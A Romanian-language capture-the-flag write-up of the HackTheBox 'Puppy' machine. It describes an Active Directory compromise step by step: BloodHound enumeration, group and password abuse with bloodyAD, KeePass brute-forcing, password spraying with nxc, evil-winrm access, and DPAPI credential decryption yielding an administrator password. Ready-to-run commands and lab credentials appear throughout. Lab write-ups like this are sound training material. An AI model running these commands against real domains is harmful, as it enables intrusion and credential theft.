---
title: "HTB: Puppy — Write-up"
description: "Enum Kerberos/SMB, BloodHound, KeePass → DPAPI → escaladare."
pubDate: "2025-10-06"
tags: ["HTB","Active Directory","Kerberos","SMB","BloodHound","DPAPI","WinRM"]
platform: "HTB"
difficulty: "Medium"
---

# Puppy

Principalele credidentiale primite de pe HTB 

![Fig. 1](./image.png)

Fig. 1

**levi.james / KingofAkron2025!**

Am dat drumul la 2 scanuri de nmap, unul pentru porturile deschise si unul care sa testeze toate porturile 

Am obtinut urmatoarele rezultate:

![Fig. 2](./image%201.png)

Fig. 2

![Fig. 3](./image%202.png)

Fig. 3

Ne salvam adresa in /etc/hosts

![Fig. 4](./image%203.png)

Fig. 4

Pentru a configura krb5.conf am copiat aceste configurari: 

[https://serverfault.com/questions/166768/kinit-wont-connect-to-a-domain-server-realm-not-local-to-kdc-while-getting-in](https://serverfault.com/questions/166768/kinit-wont-connect-to-a-domain-server-realm-not-local-to-kdc-while-getting-in)

![Fig. 5](./image%204.png)

Fig. 5

Acum, configuram kinit cu adresa primita. 

![Fig. 6](./image%205.png)

Fig. 6

1. Pentru a raspunde la prima intrebare, voi folosi urmatoarea comanda astfel incat sa putem sa vedem toate shareurile smb de pe server. 

*smbclient -L [//10.10.11.70](https://10.10.11.70/) -U "levi.james@PUPPY.HTB"*

![Fig. 7](./image%206.png)

Fig. 7

2. Aflarea grupului din care face parte levi.james. 

Putem folosi tool ul bloodhound pentru a vedea grupul. Am incercat prin alte metode si am mai obtinut alte informatii care se pot vedea in poza de mai jos 

![Fig. 8](./image%207.png)

Fig. 8

Pentru a putea vizualiza graficul din bloodhound, vom descarca un ticket TGT. Pana atunci ne aliniam cu data de pe aplicatie si mai apoi solicitam fisierele .json pentru experitza bloodhound pe mai tarziu. 

*impacket-getTGT puppy.htb/'levi.james':'KingofAkron2025!' -dc-ip 10.10.11.70*

![Fig. 9](./image%208.png)

Fig. 9

Dupa ce am descarcat fisierele ZIP, le-am incarcat in Bloodhound iar dupa ce fisierele au fost analizate, am primit urmatorul grafic pentru levi.james 

*bloodhound-python -d PUPPY.HTB -u levi.james -k -ns 10.10.11.70 -dc dc.puppy.htb -c All --dns-tcp --zip*   

![Fig. 10](./image%209.png)

Fig. 10

3. O terminologie interesanta pe care o are grupul HR peste Developers este GenericWrite. 

![Fig. 11](./image%2010.png)

Fig. 11

4. Pentru a adauga user-ul levi.james in Developers, vom folosi bloodyAD. 
O documentatie relevanta se poate regasi aici:
[https://adminions.ca/books/active-directory-enumeration-and-exploitation/page/bloodyad](https://adminions.ca/books/active-directory-enumeration-and-exploitation/page/bloodyad)

*bloodyAD --host dc.puppy.htb --dc-ip 10.10.11.70 \
-d puppy.htb -u 'levi.james' -p 'KingofAkron2025!' \
add groupMember 'Developers' 'levi.james'*

![Fig. 12](./image%2011.png)

Fig. 12

5. Dupa conectarea pe smb am accesat share ul Dev si am descarcat tot ce aveam pe el. 
Un fisier care ne raspunde la intrebare, se afla in ce am descarcat. 

*impacket-smbclient -k -no-pass 'PUPPY.HTB/levi.james@dc.puppy.htb' -dc-ip 10.10.11.70*

![Fig. 13](./image%2012.png)

Fig. 13

6. Pentru a putea cracka baza de date in format KeePass va trebui sa facem bruteforce. keepass2john nu a functionat 

![Fig. 14](./image%2013.png)

Fig. 14

Vom incerca sa o spargem cu acest tool. 

[https://github.com/r3nt0n/keepass4brute](https://github.com/r3nt0n/keepass4brute)

*~/Desktop/Tools/keepass4brute.sh recovery.kdbx /usr/share/wordlists/rockyou.txt*

Dupa utilizarea toolului, ni s-a afisat parola. 

![Fig. 15](./image%2014.png)

Fig. 15

1. Pentru a putea gasi userul care are una dintre parolele din baza de date, va trebui sa facem un spray attack. O sa colectam toate parolele din baza de date KeePassXC

![Fig. 16](./image%2015.png)

Fig. 16

Si acum vom colecta toti userii din datele de pe bloodhound. 

*jq -r '.data[] | .Properties.samaccountname // empty' 20251005041029_users.json \
| tr '[:upper:]' '[:lower:]' | sort -u > users_all.txt*

![Fig. 17](./image%2016.png)

Fig. 17

Pentru a face spray attack, o sa utilizam nxc cu aceasta lista de uesri si lista de parole facuta. 

*nxc smb 10.10.11.70 -d PUPPY.HTB -u users_all.txt -p pass.txt --continue-on-success -t 1000*

![Fig, 18](./image%2017.png)

Fig, 18

8. In Bloodhound, contul ant.edwards esste peste adam.silver.

![Fig. 19 ](./image%2018.png)

Fig. 19 

9.  Pentru a ne creea acces la adam.silver o sa trebuiasca sa ii punem o parola pe care o cunoastem. Avand in vedere ca ant.edward are genericall peste adam.silver, o sa ii putem sa ii schimbam parola. 

*bloodyAD --host 10.10.11.70 -d puppy.htb -u 'ant.edwards' -p 'Antman2025!' set password 'adam.silver' 'NewPass123'* 

![Fig. 20](./image%2019.png)

Fig. 20

Incercand sa ma conectez la evil-winrm observam ca nu avem autorizatie.

*evil-winrm -i 10.10.11.70 -u 'PUPPY.HTB\adam.silver' -p 'NewPass123'* 

![Fig. 21](./image%2020.png)

Fig. 21

Am incercat pe smbclient si primim informatia ca contul nostru este disabled. O sa incercam sa il activam 

*impacket-smbclient 'PUPPY.HTB/adam.silver:NewPass123'@10.10.11.70 -dc-ip 10.10.11.70* 

![Fig. 22](./image%2021.png)

Fig. 22

*bloodyAD --host 10.10.11.70 -d PUPPY.HTB -u 'ant.edwards' -p 'Antman2025!' remove uac 'adam.silver' -f ACCOUNTDISABLE*

![Fig. 23](./image%2022.png)

Fig. 23

Dupa resetarea parolei si activarea contului am reusit sa creeam o sesiune la smb. 

*impacket-smbclient 'PUPPY.HTB/adam.silver:NewPass123'@10.10.11.70 -dc-ip 10.10.11.70*

![Fig. 24](./image%2023.png)

Fig. 24

Reincercand sesiunea de evil-winrm am reusit sa ma conectez la adam.silver

*evil-winrm -i 10.10.11.70 -u 'PUPPY.HTB\adam.silver' -p 'NewPass123’*

![Fig. 25](./image%2024.png)

Fig. 25

Trebuie neaparat sa fie si timpul updatat astfel incat sa fie cu acelasi de pe domeniu. 

*ntpdate-s 10.10.11.70*

![Fig. 26](./image%2025.png)

Fig. 26

![Fig. 27](./image%2026.png)

Fig. 27

10. In path-ul C:\Backups se poate obesrva fisierul site-backup-2024-12-30.zip pe care am putea sa il descarcam sa vedem ce am putea gasi in el. 

*download site-backup-2024-12-30.zip*

![Fig. 28](./image%2027.png)

Fig. 28

Dezarhivand aceasta arhiva, se pare ca avem o pagina web. 

*unzip site-backup-2024-12-30.zip*

![Fig. 29](./image%2028.png)

Fig. 29

Iar acum uitandu-ne in fisierul **nms-auth-config.xml.bak** se poate gasi o parola intr-un field <bind-assword> pentru user-ul steph.cooper

![Fig. 30](./image%2029.png)

Fig. 30

11. In ierarhia de pe bloodhound se poate gasi faptul ca contul steph.cooper_adm este membru al administratorilor si are permisiuni de scriere peste steph.cooper. 

![Fig. 31](./image%2030.png)

Fig. 31

Acum cu noile credidentiale o sa intram tot cu o sesiune evil-winrm si o sa vizualizam fisierele acestuia. Scopul nostru e sa facem un lateral movment pe contul steph.cooper_adm. 

![Fig. 32](./image%2031.png)

Fig. 32

Uploadam winPEASx64.exe pe masina si dupa il rulam. 

*upload winPEASx64.exe*

![Fig. 33](./image%2032.png)

Fig. 33

*./winPEASx64.exe*

![Fig. 34](./image%2033.png)

Fig. 34

Am verificat pentru fisiere DPAPI 

![Fig. 35](./image%2034.png)

Fig. 35

Mai departe o sa urmeze sa descarcam fisierele.

*download Microsoft*

![Fig. 36](./image%2035.png)

Fig. 36

Din pacate fisierele care ne trebuiesc noua nu sunt vizibile, si trebuie sa le fortam sa le descarcam. Ca sa nu descarcam din nou tot folderul Microsoft am putea sa descarcam doar ce avem nevoie pentru DPAPI, adica MasterKey si CredFile.

MasterKey: 

*C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407*

CredFile: *C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D*
CredFile: *C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9*

![Fig. 37](./image%2036.png)

Fig. 37

Si acum le facem vizibile. 

*attrib -s -h MasterKey
attrib -s -h CredFile1
attrib -s -h CredFile2*

![Fig. 38](./image%2037.png)

Fig. 38

Prima comanda pe care o sa o folosim este 

*impacket-dpapi masterkey -file MasterKey -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password 'ChefSteph2025!'*

![Fig. 39](./image%2038.png)

Fig. 39

*Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84*

Acum cu cheia decriptata putem sa obtinem credidentialele. 

O sa salvam cheia ca variabila si o sa aplicam dpapi pentru primul fisier. 

![Fig. 40](./image%2039.png)

Fig. 40

si aucm pe al 2-lea. 

![Fig. 41](./image%2040.png)

Fig. 41

Bingo. 

**Username    : steph.cooper_adm
Unknown     : FivethChipOnItsWay2025!**

1. Am sa presupun ca ce ne mai ramane de facut este sa facem o sesiune evil-winrm si sa accesam flagul. 

*evil-winrm -i 10.10.11.70 -u 'PUPPY.HTB\steph.cooper_adm' -p 'FivethChipOnItsWay2025!'* 

![Fig. 42](./image%2041.png)

Fig. 42
